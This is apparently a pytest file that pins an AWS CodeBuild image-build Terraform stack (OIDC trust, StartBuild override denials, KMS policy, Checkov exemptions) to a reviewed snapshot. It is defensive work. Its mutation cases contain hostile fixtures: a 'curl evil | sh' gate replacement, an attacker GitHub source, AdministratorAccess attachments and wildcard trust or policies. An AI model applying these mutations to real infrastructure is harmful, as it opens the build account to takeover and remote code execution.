"""Pin the runner image build part of ``infra/account`` exactly (FREES-36).

Checkov's CKV_AWS_358 does not recognise GitHub immutable subjects, and CKV_AWS_316 fails on
the privileged build container that rootless Buildah needs. ``infra/.checkov.baseline``
therefore exempts exactly those findings, and this test is the control that replaces them.

* The tracked file set of ``infra/account`` and the full ``kind.type.name`` block inventory
  are exact, and no ``module`` block exists. Override files, ``*.tf.json``, ``*.auto.tfvars``,
  extra roles, policy attachments and extra projects all fail.
* Every block of ``image_build.tf`` and ``iam_image_build_role.tf``, their locals, and the
  image build variables and outputs equal the reviewed snapshot
  ``tests/fixtures/infra/expected_image_build_blocks.json`` as whole blocks, including the
  inline gating buildspec, the KMS key policy and the lifecycle policy.
* Semantic checks state the intent of the snapshot: the trust conditions, the ``StartBuild``
  override denials against the AWS service reference, and where ``*`` may appear.
* Each negative case (M1 to M10 of the PR #51 review, and more) mutates a copy of the stack
  and must fail the section it targets.

Regenerate the snapshot only for a reviewed change: run this file with ``python`` from the
repository root and review the diff of the JSON file.
"""

from __future__ import annotations

import ast
import json
import re
import sys
from functools import partial
from typing import TYPE_CHECKING, Any, Final, cast

import pytest

from tests.unit.infra.account_stack import (
    ACCOUNT_DIRECTORY,
    EXPECTED_BLOCKS,
    EXPECTED_FILES,
    REPOSITORY_ROOT,
    block_inventory,
    copy_account,
    file_inventory,
    load_terraform,
)

if TYPE_CHECKING:
    from collections.abc import Callable
    from pathlib import Path

BASELINE: Final[Path] = REPOSITORY_ROOT / "infra" / ".checkov.baseline"
SNAPSHOT: Final[Path] = (
    REPOSITORY_ROOT / "tests" / "fixtures" / "infra" / "expected_image_build_blocks.json"
)
LINE_MARKER_PREFIX: Final[str] = "__"
IMAGE_BUILD_FILES: Final[tuple[str, ...]] = ("image_build.tf", "iam_image_build_role.tf")
IMAGE_BUILD_VARIABLES: Final[tuple[str, ...]] = (
    "runner_repository",
    "runner_repository_id",
    "image_build_workflow_file",
    "image_build_environment",
    "image_builder_image",
    "image_build_timeout_minutes",
    "image_build_queued_timeout_minutes",
    "image_staging_retention_days",
    "image_build_log_retention_days",
)
IMAGE_BUILD_OUTPUTS: Final[tuple[str, ...]] = (
    "image_build_role_arn",
    "image_build_project_name",
    "image_staging_repository_url",
)
EXPECTED_BASELINE: Final[dict[str, set[tuple[str, str]]]] = {
    "/account/iam_plan_role.tf": {("aws_iam_policy_document.plan_trust", "CKV_AWS_358")},
    "/account/iam_image_build_role.tf": {
        ("aws_iam_policy_document.image_build_trust", "CKV_AWS_358")
    },
    "/account/image_build.tf": {("aws_codebuild_project.runner_image", "CKV_AWS_316")},
}
OIDC_HOST: Final[str] = "${local.oidc_host}"
EXPECTED_TRUST_CONDITIONS: Final[list[dict[str, object]]] = [
    {"test": "StringEquals", "variable": f"{OIDC_HOST}:aud", "values": ["sts.amazonaws.com"]},
    {
        "test": "StringEquals",
        "variable": f"{OIDC_HOST}:sub",
        "values": ["${local.image_build_subject}"],
    },
    {
        "test": "StringEquals",
        "variable": f"{OIDC_HOST}:repository_id",
        "values": ["${var.runner_repository_id}"],
    },
    {
        "test": "StringEquals",
        "variable": f"{OIDC_HOST}:repository_owner_id",
        "values": ["${var.github_owner_id}"],
    },
    {
        "test": "StringEquals",
        "variable": f"{OIDC_HOST}:job_workflow_ref",
        "values": ["${local.image_build_workflow}"],
    },
]
EXPECTED_SUBJECT: Final[str] = (
    "repo:FreeSecDev@347867179/linux-compliance-runner@1433323102:environment:release"
)
EXPECTED_WORKFLOW: Final[str] = (
    "FreeSecDev/linux-compliance-runner/.github/workflows/image-build.yml@refs/heads/main"
)
START_BUILD_CONDITION_KEYS: Final[frozenset[str]] = frozenset(
    {
        "artifacts",
        "artifacts.bucketOwnerAccess",
        "artifacts.encryptionDisabled",
        "artifacts.location",
        "autoRetryLimit",
        "cache",
        "cache.location",
        "cache.modes",
        "cache.type",
        "encryptionKey",
        "environment",
        "environment.certificate",
        "environment.computeType",
        "environment.environmentVariables",
        "environment.environmentVariables.name",
        "environment.environmentVariables.value",
        "environment.environmentVariables/${name}.value",
        "environment.fleet.fleetArn",
        "environment.image",
        "environment.imagePullCredentialsType",
        "environment.privilegedMode",
        "environment.registryCredential",
        "environment.registryCredential.credential",
        "environment.registryCredential.credentialProvider",
        "environment.type",
        "logsConfig",
        "logsConfig.s3Logs",
        "logsConfig.s3Logs.bucketOwnerAccess",
        "logsConfig.s3Logs.encryptionDisabled",
        "logsConfig.s3Logs.location",
        "logsConfig.s3Logs.status",
        "secondaryArtifacts",
        "secondaryArtifacts.artifactIdentifier",
        "secondaryArtifacts.bucketOwnerAccess",
        "secondaryArtifacts.encryptionDisabled",
        "secondaryArtifacts.location",
        "secondaryArtifacts/${artifactIdentifier}.bucketOwnerAccess",
        "secondaryArtifacts/${artifactIdentifier}.encryptionDisabled",
        "secondaryArtifacts/${artifactIdentifier}.location",
        "secondarySources",
        "secondarySources.auth.resource",
        "secondarySources.auth.type",
        "secondarySources.buildStatusConfig.context",
        "secondarySources.buildStatusConfig.targetUrl",
        "secondarySources.buildspec",
        "secondarySources.insecureSsl",
        "secondarySources.location",
        "secondarySources.sourceIdentifier",
        "secondarySources/${sourceIdentifier}.auth.resource",
        "secondarySources/${sourceIdentifier}.auth.type",
        "secondarySources/${sourceIdentifier}.buildStatusConfig.context",
        "secondarySources/${sourceIdentifier}.buildStatusConfig.targetUrl",
        "secondarySources/${sourceIdentifier}.buildspec",
        "secondarySources/${sourceIdentifier}.insecureSsl",
        "secondarySources/${sourceIdentifier}.location",
        "serviceRole",
        "source",
        "source.auth.resource",
        "source.auth.type",
        "source.buildStatusConfig.context",
        "source.buildStatusConfig.targetUrl",
        "source.buildspec",
        "source.insecureSsl",
        "source.location",
    }
)
GATE_INPUT_KEYS: Final[frozenset[str]] = frozenset(
    {
        "environment",
        "environment.environmentVariables",
        "environment.environmentVariables.name",
        "environment.environmentVariables.value",
        "environment.environmentVariables/${name}.value",
    }
)
GATE_COMMANDS: Final[tuple[str, ...]] = (
    (
        '[[ \\"$EXPECTED_COMMIT\\" =~ ^[0-9a-f]{40}$ ]] || '
        "{ echo 'error: EXPECTED_COMMIT must be a full commit SHA' >&2; false; }"
    ),
    (
        '[[ \\"$BUILD_DATE\\" =~ '
        "^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z$ ]]"
        " || { echo 'error: BUILD_DATE must be a UTC RFC 3339 time' >&2; false; }"
    ),
    "rm -rf ${local.runner_source_dir}",
    (
        "GIT_TERMINAL_PROMPT=0 timeout 300 git -c credential.helper= clone --quiet "
        "--no-tags --single-branch --branch main ${local.runner_clone_url} "
        "${local.runner_source_dir}"
    ),
    (
        "git -C ${local.runner_source_dir} merge-base --is-ancestor "
        '\\"$EXPECTED_COMMIT\\" refs/remotes/origin/main || '
        "{ echo 'error: EXPECTED_COMMIT is not a commit on main of "
        "${var.runner_repository}' >&2; false; }"
    ),
    (
        "git -C ${local.runner_source_dir} -c advice.detachedHead=false checkout --quiet "
        '--detach \\"$EXPECTED_COMMIT\\"'
    ),
    (
        'export BUILT_COMMIT=\\"$(git -C ${local.runner_source_dir} rev-parse HEAD)\\" '
        '&& test \\"$BUILT_COMMIT\\" = \\"$EXPECTED_COMMIT\\"'
    ),
    (
        "cd ${local.runner_source_dir} && IMAGE_SOURCE_DIR=${local.runner_source_dir} "
        "timeout --kill-after=60 ${local.build_script_timeout} "
        "bash codebuild/build-image.sh"
    ),
    ". /tmp/image-build/result.env",
)
EXPECTED_BUILDSPEC: Final[dict[str, object]] = {
    "version": 0.2,
    "env": {
        "shell": "bash",
        "exported-variables": [
            "BUILT_COMMIT",
            "IMAGE_DIGEST",
            "IMAGE_TAG",
            "IMAGE_REFERENCE",
            "BUILDAH_VERSION",
        ],
    },
    "phases": {
        "build": {
            "on-failure": "ABORT",
            "commands": list(GATE_COMMANDS),
        }
    },
}
EXPECTED_KEY_POLICY: Final[dict[str, object]] = {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AccountAdministersTheKey",
            "Effect": "Allow",
            "Principal": {"AWS": "arn:aws:iam::${var.account_id}:root"},
            "Action": "kms:*",
            "Resource": "*",
        },
        {
            "Sid": "CloudWatchLogsUsesTheKeyForTheBuildLogGroup",
            "Effect": "Allow",
            "Principal": {"Service": "logs.${var.aws_region}.amazonaws.com"},
            "Action": [
                "kms:Encrypt",
                "kms:Decrypt",
                "kms:ReEncrypt*",
                "kms:GenerateDataKey*",
                "kms:DescribeKey",
            ],
            "Resource": "*",
            "Condition": {
                "ArnEquals": {
                    "kms:EncryptionContext:aws:logs:arn": "${local.image_build_log_group_arn}"
                }
            },
        },
    ],
}


def normalise(value: object) -> object:
    """Remove python-hcl2's one-element attribute wrappers and line markers, recursively."""
    if isinstance(value, dict):
        entries = cast("dict[str, object]", value)
        return {
            key: normalise(member)
            for key, member in entries.items()
            if not key.startswith(LINE_MARKER_PREFIX)
        }
    if isinstance(value, list):
        items = cast("list[object]", value)
        if items and all(isinstance(item, dict) for item in items):
            return [normalise(item) for item in items]
        if len(items) == 1:
            inner: object = items[0]
            if isinstance(inner, dict):
                return normalise(cast("dict[str, object]", inner))
            return inner
        return items
    return value


def add_block(blocks: dict[str, object], key: str, value: object) -> None:
    blocks[key] = value if key not in blocks else "duplicate"


def add_file_blocks(blocks: dict[str, object], document: dict[str, Any]) -> None:
    for kind in ("resource", "data"):
        for entry in cast("list[dict[str, dict[str, object]]]", document.get(kind, [])):
            for type_name, named in entry.items():
                for name, body in named.items():
                    add_block(blocks, f"{kind}.{type_name}.{name}", normalise(body))
    for local_entry in cast("list[dict[str, object]]", document.get("locals", [])):
        for name, value in cast("dict[str, object]", normalise(local_entry)).items():
            add_block(blocks, f"local.{name}", value)


def named_blocks(path: Path, kind: str) -> dict[str, object]:
    declared: dict[str, object] = {}
    for entry in cast("list[dict[str, object]]", load_terraform(path).get(kind, [])):
        declared.update(cast("dict[str, object]", normalise(entry)))
    return declared


def image_build_blocks(directory: Path) -> dict[str, object]:
    blocks: dict[str, object] = {}
    for file_name in IMAGE_BUILD_FILES:
        add_file_blocks(blocks, load_terraform(directory / file_name))
    for file_name, kind, names in (
        ("variables.tf", "variable", IMAGE_BUILD_VARIABLES),
        ("outputs.tf", "output", IMAGE_BUILD_OUTPUTS),
    ):
        declared = named_blocks(directory / file_name, kind)
        for name in names:
            blocks[f"{kind}.{name}"] = declared.get(name)
    return blocks


def decoded(expression: object, function: str) -> object:
    """Return the literal argument of ``${function(...)}`` as python-hcl2 renders it."""
    text = cast("str", expression)
    prefix, suffix = f"${{{function}(", ")}"
    assert text.startswith(prefix), text[:40]
    assert text.endswith(suffix), text[-40:]
    return ast.literal_eval(text[len(prefix) : -len(suffix)])


def snapshot() -> dict[str, object]:
    return cast("dict[str, object]", json.loads(SNAPSHOT.read_text(encoding="utf-8")))


def changed_blocks(directory: Path) -> list[str]:
    actual = image_build_blocks(directory)
    expected = snapshot()
    return sorted(
        key for key in set(actual) | set(expected) if actual.get(key) != expected.get(key)
    )


def file_inventory_differs(directory: Path) -> bool:
    return file_inventory(directory) != sorted(EXPECTED_FILES)


def block_inventory_differs(directory: Path) -> bool:
    return block_inventory(directory) != sorted(EXPECTED_BLOCKS)


def image_build_blocks_differ(directory: Path) -> bool:
    return bool(changed_blocks(directory))


SECTIONS: Final[dict[str, Callable[[Path], bool]]] = {
    "file_inventory": file_inventory_differs,
    "block_inventory": block_inventory_differs,
    "image_build_blocks": image_build_blocks_differ,
}


def block(key: str) -> dict[str, Any]:
    return cast("dict[str, Any]", image_build_blocks(ACCOUNT_DIRECTORY)[key])


def statements(key: str) -> list[dict[str, Any]]:
    return cast("list[dict[str, Any]]", block(key)["statement"])


def local(name: str) -> object:
    return image_build_blocks(ACCOUNT_DIRECTORY)[f"local.{name}"]


@pytest.mark.parametrize("section", sorted(SECTIONS))
def test_account_stack_matches_the_pinned_section(section: str) -> None:
    assert not SECTIONS[section](ACCOUNT_DIRECTORY), section


def test_snapshot_differences_are_reported_by_key() -> None:
    assert changed_blocks(ACCOUNT_DIRECTORY) == []


def test_trust_has_one_statement_and_five_exact_conditions() -> None:
    trust = statements("data.aws_iam_policy_document.image_build_trust")
    assert len(trust) == 1
    statement = trust[0]
    assert statement["effect"] == "Allow"
    assert statement["actions"] == ["sts:AssumeRoleWithWebIdentity"]
    assert statement["principals"] == [
        {
            "type": "Federated",
            "identifiers": ["${data.aws_iam_openid_connect_provider.github.arn}"],
        }
    ]
    assert statement["condition"] == EXPECTED_TRUST_CONDITIONS
    rendered = json.dumps(statement)
    assert "*" not in rendered
    assert "StringLike" not in rendered


def test_subject_and_workflow_render_to_the_runner_release_environment() -> None:
    blocks = image_build_blocks(ACCOUNT_DIRECTORY)
    variables = {
        name: cast("dict[str, Any]", blocks[f"variable.{name}"])["default"]
        for name in ("runner_repository", "runner_repository_id", "image_build_environment")
    }
    owner, _, repository = cast("str", variables["runner_repository"]).partition("/")
    values = {
        "runner_owner_name": owner,
        "runner_repository_name": repository,
        "github_owner_id": "347867179",
        "runner_repository_id": variables["runner_repository_id"],
        "image_build_environment": variables["image_build_environment"],
        "runner_repository": variables["runner_repository"],
        "image_build_workflow_file": cast(
            "dict[str, Any]", blocks["variable.image_build_workflow_file"]
        )["default"],
    }

    def render(expression: object) -> str:
        return re.sub(
            r"\$\{(?:local|var)\.([a-z_]+)\}",
            lambda match: cast("str", values[match.group(1)]),
            cast("str", expression),
        )

    assert render(local("image_build_subject")) == EXPECTED_SUBJECT
    assert render(local("image_build_workflow")) == EXPECTED_WORKFLOW


def test_start_build_overrides_are_denied_except_the_two_gate_inputs() -> None:
    denied = cast("list[str]", local("start_build_denied_override_keys"))
    assert len(denied) == len(set(denied))
    assert set(denied) <= START_BUILD_CONDITION_KEYS
    assert not set(denied) & GATE_INPUT_KEYS
    for key in START_BUILD_CONDITION_KEYS - GATE_INPUT_KEYS:
        parents = {key.split(".", maxsplit=1)[0].split("/", maxsplit=1)[0], key}
        assert parents & set(denied), f"StartBuild override key {key} is not denied"
    assert local("start_build_allowed_environment_variables") == ["EXPECTED_COMMIT", "BUILD_DATE"]
    permissions = block("data.aws_iam_policy_document.image_build_permissions")
    dynamic = cast("list[dict[str, Any]]", permissions["dynamic"])
    assert dynamic == [
        {
            "statement": {
                "for_each": "${local.start_build_denied_override_keys}",
                "content": [
                    {
                        "sid": "DenyStartBuildOverride${statement.key}",
                        "effect": "Deny",
                        "actions": ["codebuild:StartBuild"],
                        "resources": ["*"],
                        "condition": [
                            {
                                "test": "Null",
                                "variable": "codebuild:${statement.value}",
                                "values": ["false"],
                            }
                        ],
                    }
                ],
            }
        }
    ]
    by_sid = {statement["sid"]: statement for statement in permissions["statement"]}
    assert by_sid["DenyStartBuildEnvironmentVariablesOtherThanTheGateInputs"] == {
        "sid": "DenyStartBuildEnvironmentVariablesOtherThanTheGateInputs",
        "effect": "Deny",
        "actions": ["codebuild:StartBuild"],
        "resources": ["*"],
        "condition": [
            {
                "test": "ForAnyValue:StringNotEquals",
                "variable": "codebuild:environment.environmentVariables.name",
                "values": "${local.start_build_allowed_environment_variables}",
            }
        ],
    }


@pytest.mark.parametrize(
    "key",
    [
        "data.aws_iam_policy_document.image_build_permissions",
        "data.aws_iam_policy_document.codebuild_permissions",
        "data.aws_iam_policy_document.plan_image_build_permissions",
    ],
)
def test_allow_statements_use_star_only_for_get_authorization_token(key: str) -> None:
    for statement in statements(key):
        if statement["effect"] != "Allow":
            continue
        assert all("*" not in action for action in statement["actions"]), statement
        if "*" in statement["resources"]:
            assert statement["actions"] == ["ecr:GetAuthorizationToken"], statement
        assert "not_actions" not in statement
        assert "not_resources" not in statement


def test_project_is_no_source_with_the_inline_gate() -> None:
    project = block("resource.aws_codebuild_project.runner_image")
    assert project["source"] == [{"type": "NO_SOURCE", "buildspec": "${local.codebuild_buildspec}"}]
    assert "source_version" not in project
    assert "secondary_sources" not in project
    assert project["concurrent_build_limit"] == 1
    environment = cast("list[dict[str, Any]]", project["environment"])[0]
    assert environment["privileged_mode"] is True
    assert environment["compute_type"] == "BUILD_GENERAL1_MEDIUM"
    assert environment["image"] == "${var.image_builder_image}"
    assert decoded(local("codebuild_buildspec"), "yamlencode") == EXPECTED_BUILDSPEC
    assert local("build_script_timeout") == "${var.image_build_timeout_minutes * 60 - 300}"
    assert local("runner_clone_url") == "https://github.com/${var.runner_repository}.git"


def test_key_policy_admits_only_the_account_and_the_build_log_group() -> None:
    policy = block("resource.aws_kms_key.image_build")["policy"]
    assert decoded(policy, "jsonencode") == EXPECTED_KEY_POLICY


def test_checkov_baseline_exempts_exactly_the_reviewed_findings() -> None:
    document = cast("dict[str, object]", json.loads(BASELINE.read_text(encoding="utf-8")))
    assert set(document) == {"failed_checks"}
    found: dict[str, set[tuple[str, str]]] = {}
    for entry in cast("list[dict[str, object]]", document["failed_checks"]):
        findings = found.setdefault(cast("str", entry["file"]), set())
        for finding in cast("list[dict[str, object]]", entry["findings"]):
            check_ids = cast("list[str]", finding["check_ids"])
            assert len(check_ids) == 1, finding
            findings.add((cast("str", finding["resource"]), check_ids[0]))
    assert found == EXPECTED_BASELINE


def append(file_name: str, text: str, directory: Path) -> None:
    path = directory / file_name
    previous = path.read_text(encoding="utf-8") if path.exists() else ""
    path.write_text(previous + text, encoding="utf-8")


def replace(file_name: str, old: str, new: str, directory: Path) -> None:
    path = directory / file_name
    text = path.read_text(encoding="utf-8")
    assert old in text, old
    path.write_text(text.replace(old, new, 1), encoding="utf-8")


LOOSE_TRUST: Final[str] = """
data "aws_iam_policy_document" "image_build_trust" {
  statement {
    effect  = "Allow"
    actions = ["sts:AssumeRoleWithWebIdentity"]

    principals {
      type        = "Federated"
      identifiers = [data.aws_iam_openid_connect_provider.github.arn]
    }

    condition {
      test     = "StringLike"
      variable = "${local.oidc_host}:sub"
      values   = ["repo:*"]
    }
  }
}
"""
SOURCE_OVERRIDE: Final[str] = """
resource "aws_codebuild_project" "runner_image" {
  source {
    type     = "GITHUB"
    location = "https://github.com/attacker/evil.git"
  }
}
"""
JSON_POLICY: Final[str] = json.dumps(
    {
        "resource": {
            "aws_iam_role_policy": {
                "extra": {
                    "role": "${aws_iam_role.image_build.id}",
                    "policy": '{"Statement":[{"Effect":"Allow","Action":"codebuild:UpdateProject",'
                    '"Resource":"*"}]}',
                }
            }
        }
    }
)
ADMIN_ATTACHMENT: Final[str] = """
resource "aws_iam_role_policy_attachment" "admin" {
  role       = aws_iam_role.image_build.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}
"""
MODULE_BLOCK: Final[str] = """
module "extra" {
  source = "./modules/extra"
}
"""
SECOND_PROJECT: Final[str] = """
resource "aws_codebuild_project" "second" {
  name         = "second"
  service_role = aws_iam_role.codebuild_service.arn

  artifacts {
    type = "NO_ARTIFACTS"
  }

  environment {
    type            = "LINUX_CONTAINER"
    compute_type    = "BUILD_GENERAL1_2XLARGE"
    image           = "aws/codebuild/standard:7.0"
    privileged_mode = true
  }

  source {
    type      = "NO_SOURCE"
    buildspec = "version: 0.2"
  }
}
"""

NEGATIVE_CASES: Final[dict[str, tuple[str, Callable[[Path], None]]]] = {
    "M1_override_file_with_loose_trust": (
        "file_inventory",
        partial(append, "iam_image_build_role_override.tf", LOOSE_TRUST),
    ),
    "M2_override_file_with_attacker_source": (
        "file_inventory",
        partial(append, "image_build_override.tf", SOURCE_OVERRIDE),
    ),
    "M3_json_file_with_extra_policy": (
        "file_inventory",
        partial(append, "extra.tf.json", JSON_POLICY),
    ),
    "M4_administrator_policy_attachment": (
        "block_inventory",
        partial(append, "iam_image_build_role.tf", ADMIN_ATTACHMENT),
    ),
    "M5_auto_tfvars_changes_the_trust_inputs": (
        "file_inventory",
        partial(
            append, "x.auto.tfvars", 'runner_repository_id = "1"\nimage_build_environment = "pr"\n'
        ),
    ),
    "M5b_variable_default_changed": (
        "image_build_blocks",
        partial(replace, "variables.tf", 'default     = "1433323102"', 'default     = "1"'),
    ),
    "M6_module_block": (
        "block_inventory",
        partial(append, "image_build.tf", MODULE_BLOCK),
    ),
    "M7_inline_policy_in_the_build_role": (
        "image_build_blocks",
        partial(
            replace,
            "iam_image_build_role.tf",
            "  max_session_duration = 3600\n  tags                 = local.image_build_tags\n}",
            "  max_session_duration = 3600\n  tags                 = local.image_build_tags\n\n"
            '  inline_policy {\n    name   = "x"\n'
            '    policy = jsonencode({ Statement = [{ Effect = "Allow", Action = "*", '
            'Resource = "*" }] })\n  }\n}',
        ),
    ),
    "M8_second_privileged_project": (
        "block_inventory",
        partial(append, "image_build.tf", SECOND_PROJECT),
    ),
    "M9a_project_source_version": (
        "image_build_blocks",
        partial(
            replace,
            "image_build.tf",
            "  badge_enabled          = false\n",
            '  badge_enabled          = false\n  source_version         = "pr/1"\n',
        ),
    ),
    "M9b_gate_command_replaced": (
        "image_build_blocks",
        partial(replace, "image_build.tf", "merge-base --is-ancestor", "curl evil | sh ||"),
    ),
    "M9c_secrets_manager_variable": (
        "image_build_blocks",
        partial(
            replace,
            "image_build.tf",
            '      type  = "PLAINTEXT"\n    }\n',
            '      type  = "PLAINTEXT"\n    }\n\n    environment_variable {\n'
            '      name  = "TOKEN"\n      value = "prod/token"\n      type  = "SECRETS_MANAGER"\n'
            "    }\n",
        ),
    ),
    "M9d_larger_compute": (
        "image_build_blocks",
        partial(replace, "image_build.tf", "BUILD_GENERAL1_MEDIUM", "BUILD_GENERAL1_2XLARGE"),
    ),
    "M10_key_policy_grants_a_foreign_account": (
        "image_build_blocks",
        partial(
            replace,
            "image_build.tf",
            'Principal = { Service = "logs.${var.aws_region}.amazonaws.com" }',
            'Principal = { AWS = "arn:aws:iam::111122223333:root" }',
        ),
    ),
    "denied_override_key_removed": (
        "image_build_blocks",
        partial(replace, "iam_image_build_role.tf", '    "source.buildspec",\n', ""),
    ),
    "environment_variable_allowed": (
        "image_build_blocks",
        partial(
            replace,
            "iam_image_build_role.tf",
            '["EXPECTED_COMMIT", "BUILD_DATE"]',
            '["EXPECTED_COMMIT", "BUILD_DATE", "STAGING_REPOSITORY_URI"]',
        ),
    ),
    "trust_sub_wildcard": (
        "image_build_blocks",
        partial(
            replace,
            "iam_image_build_role.tf",
            "values   = [local.image_build_subject]",
            'values = ["*"]',
        ),
    ),
    "role_permissions_boundary": (
        "image_build_blocks",
        partial(
            replace,
            "iam_image_build_role.tf",
            "  max_session_duration = 3600\n  tags                 = local.image_build_tags\n}",
            "  max_session_duration = 3600\n  tags                 = local.image_build_tags\n"
            '  permissions_boundary = "arn:aws:iam::aws:policy/AdministratorAccess"\n}',
        ),
    ),
    "lifecycle_expiry_removed": (
        "image_build_blocks",
        partial(replace, "image_build.tf", 'countType   = "sinceImagePushed"', 'countType = "x"'),
    ),
    "staging_tags_mutable": (
        "image_build_blocks",
        partial(replace, "image_build.tf", '"IMMUTABLE"', '"MUTABLE"'),
    ),
}


def test_unmutated_copy_passes_every_section(tmp_path: Path) -> None:
    copy = copy_account(tmp_path / "account")
    assert [name for name, failing in SECTIONS.items() if failing(copy)] == []


@pytest.mark.parametrize("case", sorted(NEGATIVE_CASES))
def test_mutated_copy_fails_the_pinned_section(tmp_path: Path, case: str) -> None:
    section, mutation = NEGATIVE_CASES[case]
    copy = copy_account(tmp_path / "account")
    mutation(copy)
    assert SECTIONS[section](copy), f"{case} was not detected by {section}"


if __name__ == "__main__":
    SNAPSHOT.write_text(
        json.dumps(image_build_blocks(ACCOUNT_DIRECTORY), indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    sys.stdout.write(f"rewrote {SNAPSHOT.relative_to(REPOSITORY_ROOT)}; review its diff\n")
